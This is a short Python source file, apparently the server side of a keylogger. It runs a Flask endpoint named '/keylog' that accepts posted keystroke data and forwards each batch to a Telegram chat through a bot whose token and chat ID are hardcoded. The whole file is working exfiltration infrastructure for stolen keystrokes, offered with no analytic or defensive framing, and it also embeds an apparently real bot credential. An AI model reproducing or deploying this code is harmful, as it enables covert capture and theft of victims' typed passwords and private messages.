from flask import Flask, request
from aiogram import Bot
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import asyncio

TOKEN = "6904720328:AAHdFOlcIoO1r_AaF9JtU0bONBs0Yn3NiZM"
CHAT_ID = 1497603032

app = Flask(__name__)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.data.decode('utf-8')
    print(f"Получено: {data}")
    asyncio.run(bot.send_message(chat_id=CHAT_ID, text=data))
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
